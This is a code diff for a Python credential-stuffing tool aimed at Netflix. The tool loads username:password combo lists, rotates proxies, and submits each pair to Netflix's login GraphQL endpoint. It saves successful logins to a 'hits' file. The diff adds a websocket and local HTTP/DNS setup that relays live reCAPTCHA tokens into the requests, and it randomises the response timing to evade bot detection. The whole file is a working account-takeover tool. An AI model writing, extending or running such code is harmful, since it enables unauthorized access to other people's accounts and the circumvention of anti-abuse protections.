@@ -1,65 +1,105 @@
 import httpx
 import json
 import random
-import threading
 import asyncio
 import os
 import sys
 from colorama import Fore, init
-import queue
 import datetime
-
+import asyncio
+import json
+import subprocess
+from websockets.asyncio.server import serve
+from websockets.exceptions import ConnectionClosedOK
+from websockets.asyncio.server import ServerConnection
+from pathlib import Path
 
 init(autoreset=True)
 
+stop_event = asyncio.Event()
+TOKEN_EVENT = asyncio.Event()
+LOCK = asyncio.Lock()
+COMBOS = asyncio.Queue()
 
+SESSIONS = {}  # Store sessions by proxy
+SESSION_LOCK = asyncio.Lock()
+
+async def extract_initial_cookies(client):
+    """Extract initial cookies before login"""
+    try:
+        # Visit Netflix main page to get initial cookies
+        response = await client.get("https://www.netflix.com")
+        cookies = {}
+        for cookie in client.cookies.jar:
+            cookies[cookie.name] = cookie.value
+        return cookies
+    except Exception as e:
+        return {}
+
+
+
+
+websocket_client = None
+TOKEN = ""
 checked = 0
 hits = 0
-LOCK = threading.Lock()
 PROXIES = []
-COMBOS = queue.Queue()
+HOST = "localhost"
+PORT = 3001
+DNS_PATH = "dns_resolver.py"
+HTML_DIR = "./www"
+HTTP_PORT = 80
 
-hits_filename = os.path.join("hits",datetime.datetime.now().strftime("%D-%m-%Y %H:%M:%S") + ".txt")
+
+hits_filename = Path("hits").joinpath(datetime.datetime.now().strftime(f"%d-%m-%Y %H;%M;%S") + ".txt")
 
 
 
-def netflix_thread(PROXIES, COMBOS: queue.Queue,verbose):
-    global checked, hits
+async def netflix_thread(PROXIES, COMBOS: asyncio.Queue, verbose):
+
+    global checked, hits, TOKEN, websocket_client
     while True:
         try:
-            combo = COMBOS.get_nowait()
-        except queue.Empty:
-            return
+            combo = COMBOS.get_nowait()  # non-blocking
+        except asyncio.QueueEmpty:
+            break  # exit if queue is empty
         try:
             username, password = combo.split(":", 1)
         except Exception:
-            with LOCK:
-                print(Fore.RED + f"[FAIL] {combo} | bad combo format")
+            print(Fore.RED + f"[FAIL] {combo} | bad combo format")
+            async with LOCK:
                 checked += 1
+            COMBOS.task_done()
             continue
 
         proxy_url = None
         if PROXIES:
             proxy_url = build_proxy_url(random.choice(PROXIES))
         headers = {"Accept": "application/json"}
-        with httpx.Client(
+        async with httpx.AsyncClient(
             proxy=proxy_url, timeout=30, verify=False, headers=headers
         ) as client:
 
-            res = client.get(
+            res = await client.get(
                 "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location"
             )
 
             country_iso_code = safe_json(res).get("country")
 
-            res = client.get(f"https://restcountries.com/v3.1/alpha/{country_iso_code}")
+            res = await client.get(
+                f"https://restcountries.com/v3.1/alpha/{country_iso_code}"
+            )
             country_data = safe_json(res)
             if country_data and len(country_data) > 0:
                 idd = country_data[0].get("idd")
                 country_code = idd.get("root") + idd.get("suffixes")[0]
             else:
                 country_code = "US"
-
+            async with LOCK:
+                await websocket_client.send(json.dumps({"action": "send"}))
+            await TOKEN_EVENT.wait()
+            async with LOCK:
+                recaptcha = TOKEN
             payload = {
                 "operationName": "CLCSScreenUpdate",
                 "variables": {
@@ -79,12 +119,10 @@ def netflix_thread(PROXIES, COMBOS: queue.Queue,verbose):
                             "name": "countryIsoCode",
                             "value": {"stringValue": country_iso_code},
                         },
-                        {"name": "recaptchaResponseTime", "value": {"intValue": 323}},
+                        {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(100,500)}},
                         {
                             "name": "recaptchaResponseToken",
-                            "value": {
-                                "stringValue": "0cAFcWeA7PTXe-Pxp3MuZn0EPvOYzJkRFicvQnnDv65kqIslXdXHORlepKkvQuEJxofjtNPzvuFaK0IkEPtAtvw4YXrfvQk6tS6WWx7MhJs3a8Z18Z4mvM9_qmZzvoXfm9ZCEw108VAU_Ra06h7ZdvO0ATAKWezGuN-zcvIYqj_6pg2HTvarKgTMTo6Pq4eGvvUF2EHzLBAmvhJqZJwVC0rCORbQxczHRB8V0ymU7HuDaQOFPxlUsLMNzfWB-wNe4E5vhzNTU6L78nlYrapy9ke-VPLONew0zekxwznbQZq7jUHKTFJRJUC0mXGst2E_cmZ2T5AO6wEsTLe7Oqfkm0ImtssCR1xoEE7TfwZRcsKRMy9G1A40mbeMk3c5mifiVXuLV9DSRUrYOHPIQaEfK2Lv8hJAo4mQyKbka-BrJcPUeO6D5hYjT3mhB5g0_y1Ih_eMxZovlwEbLxSEqGFeTH3tIQ323VrJktv4U8t27rAUn49tGLLcVVNlWMo271KqHRWD1QJZ3ALLBLMDc6NKdOEgFB6FkgqUfL7_DPfQV6Su5z5BqZtPhEtdT6e4zoPd3t9GUR_nXtdblZYZMTC2Y-PkcHSqigpn5iVDSsrbRHG05TfzaBxS0j5Vv_GphfNQj_bwiXQZ_2PSsNvfZ5ogZUPXoW6C7moh6IJsig3vAnkatBQVIWy6xcsQZ2AnocEaxQxf5JZhr-8HQbtdYtKganrRFRpVSUKWNzooPtgfU7b8kjnFrHSTteeCnNR5RxK9WAqvjZ6Ov2lqdo7VrU0wfD2cLHkRPsoLlTpz9Q9Ls6Cs2xAHI5rI87hDWghIFVrGa4ylRcghmS3aB_GiGb44fD2R8zpvs_F9eZ_G2txgeKer5LQoImKaUx0tIjpsNSGEsBlKHY6xbw-MqeToKyI6P8w4pf2jI-wJXDuEyLI_CalGvdwAyFfEvIWvaGVln2GS2QssIUEUtveNrYFQlzK-JzVjQ6oDpcMoq3DgY76jcmB3pBUKdrR1x-1t9eg1nimgG7Z9mY7zrFdIUo3v4Psk-5u09aCGMwSCV89n6oQA07d7qAY2EJsODOvZf5Gd12EZZ_kJJXJACRbGKTZfE4JGpuqmW3ditsWhB3M2Af0umrbZfhgh7cQ_SA-NXUsVLpGTnHwBDeJhBlCJSbR42X_ClGKCJHanqWpAR0sRvgZNvB8X0Um-S01gHMEOt3rJuc2fdIw7NSHVE_o0IUT8TLnGxR-JLOY30xgmTuR5r9LuBZV_TgVLW19ZuHoYxBCt3vJnwGR0tcp_WwVQQDPRNDgizS9smxglu3zo1ZqikYv4qzDaTOeFYDCtR1pGePMFvjthy8BHN9MYnCbPk3PWR7SROJ1u_aRWA1d28Z_bTn0qdIVJOmRMFg-aohTjAw7qomonVoPH0eni2RwgRyqPJweri-k_RehdlvNiH7SLqQ9Swr6lzb9dhnqIhWzk0g6DdRpxnAUtEKgGL2vn18440vL4P7rLGl8H8LpMnwknQK-gaM-rvGHq1lbnRSOVWqFxs6Kkaa7EXb7tiM2jOc4HnUQkowXNvXPZ5vrpFgiPi_J6E2U-wofkGPk-V3NVAJrNm8rzNkYNYm5OH545XGSNQPFLl5iHH5WPauMpz_9UZ0sUl22MNyic_hAmzp4FTo17JCPy8wyb79AuDg6n5_l5SapkQfLWyiLFO8iTfBOEXKgyzVhb6gMa9nmTJY9UIwEWUcBqsR9Jb2UYvQKZQ5NDbTZOWrcgO8L_mjdvy9MQEuXqo9g-zWCF76APduL7NNldsvPlMofepilIC-uB5K3SrbBO_ENf4FSYeg5d1Lhg8OwY70mzdSHitOLejfPhq_ss_5CNtiL1KFb9oj1ix4p0QZXWiEwKJAQ8_SivT3_W4RYgRnvIXzoTalRvL1uF-AlXyc0XtnlA4qZDZ0yIlQwlYXE6XG0U0f6AtXk0i11e0ESBTC-tc3ERQH0hg_keC97ue_2yp0CFjS7GQb0MV7CK-4TjGuFcg8FsksxXalUnpDRm5gzQlo8GiW7Y-rey4-0zM2DThEtJR8ke8SbjbPEBSSknBkXEtfSZvUI637hjKb74YeI3FyDlClqeE0qP5qZ08YG04PfAOAl-MM4zAMAXYnopcyhiSTvb4xPY5C79hBglzsv9m97L04XVE0H4k"
-                            },
+                            "value": {"stringValue": recaptcha},
                         },
                     ],
                 },
@@ -98,35 +136,45 @@ def netflix_thread(PROXIES, COMBOS: queue.Queue,verbose):
             headers = {"Content-Type": "application/json", "Accept": "application/json"}
 
             try:
-                result = httpx.post(
+                result = await client.post(
                     "https://web.prod.cloud.netflix.com/graphql",
                     headers=headers,
                     json=payload,
                 )
                 raw = safe_json(result)
                 all_text = str(raw)
-            
-                
-                if (("Incorrect password " not in all_text) and ("alert-message-header" not in all_text) and ("sign in" not in all_text)):
-                    print(Fore.GREEN+"[+] login successful !")
-                    if (verbose):
+
+                if (
+                    ("Incorrect password " not in all_text)
+                    and ("alert-message-header" not in all_text)
+                    and ("sign in" not in all_text)
+                ):
+                    
+                    if verbose:
                         print(Fore.GREEN + f"[+] login successful with {combo}  !")
-                    save_hit(username,password)
-                    with LOCK:
+                    else :
+                        print(Fore.GREEN + "[+] login successful  !")
+                    save_hit(username, password)
+                    async with LOCK:
                         checked += 1
                         hits += 1
-                elif (verbose):
+                elif verbose:
                     print(Fore.RED + f"[!] login failed with {combo}  !")
+                    async with LOCK:
+                        checked += 1
                 else:
-                    with LOCK:
+                    async with LOCK:
                         checked += 1
             except httpx.RequestError:
-                with LOCK:
+                async with LOCK:
                     print(Fore.RED + f"[FAIL] {combo} [retrying...]")
                 continue
+            finally:
+                COMBOS.task_done()
 
-def save_hit(username,password):
-    with open(hits_filename,"a",encoding="utf-8") as f:
+
+def save_hit(username, password):
+    with open(hits_filename, "a", encoding="utf-8") as f:
         f.write(f"{username}:{password}\n")
 
 
@@ -164,8 +212,9 @@ def build_proxy_url(line: str):
     return None
 
 
-async def main():
+async def checker():
     global PROXIES, COMBOS
+    await asyncio.sleep(1)
     print(
         r"""
     _        _______ _________ _______           _______  _______  _        _______  _______ 
@@ -197,7 +246,6 @@ async def main():
         CHECKER_TYPE = input("> ")
     CHECKER_TYPE = int(CHECKER_TYPE)
 
-
     use_proxies = input("[*] Use proxies? (Y/N): ").strip().upper() == "Y"
 
     if use_proxies:
@@ -205,46 +253,105 @@ async def main():
             with open("proxies.txt", "r", encoding="utf-8") as f:
                 PROXIES = [line.strip() for line in f if line.strip()]
         else:
-            print(Fore.RED + "[!] no proxies available, try adding proxies in proxies.txt")
-            print(Fore.RED + "or you can continue without a proxy so using your (IP/VPN):")
+            print(
+                Fore.RED + "[!] no proxies available, try adding proxies in proxies.txt"
+            )
+            print(
+                Fore.RED + "or you can continue without a proxy so using your (IP/VPN):"
+            )
             if input("[*] continue (Y/N): ").strip().upper() != "Y":
                 sys.exit(1)
 
     if not PROXIES:
         print(Fore.YELLOW + "[+] Proxyless mode enabled (using your IP/VPN).")
-    
+
     try:
         THREADS_COUNT = int(input("threads [default:100]: ") or 100)
     except:
         THREADS_COUNT = 100
     verbose = input("you want to use verbose mode (Y/N) : ").strip().upper() == "Y"
-    
+
     with open("combos.txt", "r", encoding="utf-8") as f:
         for line in f:
             if line.strip():
-                COMBOS.put(line.strip())
-    
+                await COMBOS.put(line.strip())
+
     combos_size = COMBOS.qsize()
 
-    threads = []
     match (CHECKER_TYPE):
         case 1:
-            for _ in range(THREADS_COUNT):
-                t = threading.Thread(
-                    target=netflix_thread,
-                    args=(
-                        PROXIES,
-                        COMBOS,
-                        verbose
-                    ),
-                )
-                threads.append(t)
-                t.start()
-            for t in threads:
-                t.join()
-            del threads
+            tasks = [
+                asyncio.create_task(netflix_thread(PROXIES, COMBOS, verbose))
+                for _ in range(THREADS_COUNT)
+            ]
+            await COMBOS.join()  # wait for all combos to be processed
 
     print(Fore.CYAN + f"Done!,  Checked {checked}/{combos_size} | Hits={hits}")
+    stop_event.set()
+
+
+async def websocket_main():
+    async with serve(handle_client, HOST, PORT):
+        print(f"🚀 WebSocket server running on ws://{HOST}:{PORT}")
+
+        # Start both subprocesses concurrently
+        dns_task = asyncio.create_task(run_dns_resolver())
+        http_task = asyncio.create_task(run_http_server())
+
+        await stop_event.wait()  # wait for signal
+
+        await asyncio.gather(dns_task, http_task)
+
+
+async def run_dns_resolver():
+    """Run dns_resolver.py as a subprocess."""
+    process = await asyncio.create_subprocess_exec(
+        "python",
+        DNS_PATH,
+        stdout=asyncio.subprocess.DEVNULL,
+        stderr=asyncio.subprocess.DEVNULL,
+    )
+    print(f"🧩 Started process: {DNS_PATH} (pid={process.pid})")
+
+
+async def run_http_server():
+    """Run a simple HTTP server to serve ./html/"""
+    process = await asyncio.create_subprocess_exec(
+        "python",
+        "-m",
+        "http.server",
+        str(HTTP_PORT),
+        "--directory",
+        HTML_DIR,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    print(f"🌐 HTTP server running at http://localhost:{HTTP_PORT} (pid={process.pid})")
+
+
+async def handle_client(websocket: ServerConnection):
+    global websocket_client, TOKEN
+    websocket_client = websocket
+    print("🔗 Client connected")
+    try:
+        async for message in websocket:
+            try:
+                data = json.loads(message)
+                recaptcha = data.get("token")
+                if recaptcha:
+                    async with LOCK:
+                        TOKEN = recaptcha
+                        TOKEN_EVENT.set()
+            except json.JSONDecodeError:
+                ...
+    except ConnectionClosedOK:
+        print("🔌 Client disconnected gracefully")
+    except Exception as e:
+        print(f"⚠️ Unexpected error: {e}")
+
+
+async def main():
+    await asyncio.gather(websocket_main(), checker())
 
 
 if __name__ == "__main__":
